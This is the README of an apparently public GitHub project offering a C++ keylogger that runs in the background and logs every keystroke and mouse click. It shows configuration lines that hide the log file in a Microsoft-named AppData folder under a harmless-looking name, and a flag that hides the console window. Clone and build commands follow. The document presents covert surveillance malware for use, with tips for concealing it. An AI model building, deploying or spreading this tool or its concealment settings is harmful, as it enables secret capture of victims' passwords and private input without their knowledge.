# C++ Keylogger

Simple Keylogger made using C++, runs in background and records and stores all Keyboard input events as well as mouse clicks

![image](https://user-images.githubusercontent.com/37842304/195666356-6f11ce8f-5a55-4722-ab72-6871b88ab111.png)


## Changing Functionality

to change the log file name and path edit the following lines in `CppKeyLogger.cpp`

```cpp
#define LOG_LOCATION "C:\\Users\\harsj\\AppData\\Local\\Microsoft\\input\\ar-QA\\"
#define LOG_FILENAME "lang.txt"
```

change `#define PRODUCTION false` to `#define PRODUCTION true` to hide the console window when executing the exe

## Building using CMake

```console
git clone https://github.com/HarshitJoshi9152/CppKeyLogger/
cd CppKeyLogger
cmake .
```

Click on CppKeyLogger.sln and build in Visual Studio 2022
